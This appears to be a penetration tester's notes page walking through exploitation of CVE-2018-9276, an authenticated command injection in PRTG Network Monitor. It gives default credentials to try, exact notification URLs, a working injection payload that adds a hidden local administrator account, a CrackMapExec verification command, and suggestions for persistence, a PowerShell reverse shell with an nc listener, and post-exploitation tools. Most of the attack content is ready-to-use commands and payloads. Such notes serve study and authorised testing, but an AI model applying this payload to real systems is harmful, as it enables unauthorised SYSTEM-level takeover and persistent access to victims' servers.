## PRTG Network Monitor – Authenticated Command Injection (CVE-2018-9276)
### Overview

- Affects versions < 18.2.39    
- Command injection via notification parameter passed directly to a PowerShell script
- Exploitation leads to remote command execution as SYSTEM
- Requires authenticated access (default/weak creds often work)
### Steps to Exploit

#### 1. Login to PRTG Web Interface

URL:

```
http://<target>:8080/
```

Try:

- `prtgadmin:prtgadmin`    
- `prtgadmin:Password123`
#### 2. Navigate to Notifications

- `Setup > Account Settings > Notifications`  
    URL:    

```
http://<target>:8080/myaccount.htm?tabid=2
```
#### 3. Create New Notification

Go to:

```
http://<target>:8080/editnotification.htm?id=new&tabid=1
```

- Name: `pwn`    
- Tick: Execute Program
- Program File: `Demo exe notification - outfile.ps1`    
- Parameter (Command Injection):

```powershell
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

This payload:

- Creates user `prtgadm1` with password `Pwn3d_by_PRTG!`    
- Adds user to local `Administrators` group
#### 4. Save Notification

You’ll be redirected back to:

```
http://<target>:8080/myaccount.htm?tabid=2
```

You should now see `pwn` listed.
#### 5. Trigger Execution (Manually or via Schedule)

- Click Test    
- You'll see: `EXE notification is queued up`
- Execution is blind — no feedback in web UI
#### 6. Verify Exploitation

Use CrackMapExec to confirm:

```bash
sudo crackmapexec smb <target_ip> -u prtgadm1 -p Pwn3d_by_PRTG!
```

Expected output:

```
[+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```
### Alternative Payloads

- Persistence: Schedule the notification to run daily    
- Reverse Shell (instead of net user): Inject PowerShell reverse shell one-liner in place of `net user` command
- Listener (before triggering):

```bash
sudo nc -lnvp 443
```
### Post-Exploitation Access

- WinRM: `evil-winrm`    
- RDP: If enabled
- SMB Exec Tools: `wmiexec.py`, `psexec.py`
### Summary Table

| Step             | Action                       |
| ---------------- | ---------------------------- |
| Auth Required    | Yes                          |
| Affected Param   | Notification → Parameters    |
| Exploit Method   | PowerShell command injection |
| Priv Esc         | SYSTEM                       |
| Default Web Port | 8080                         |
| Verification     | CrackMapExec / shell access  |
# Tags
> #Exploitation #Application-Exploitation #PRTG-Network-Monitor 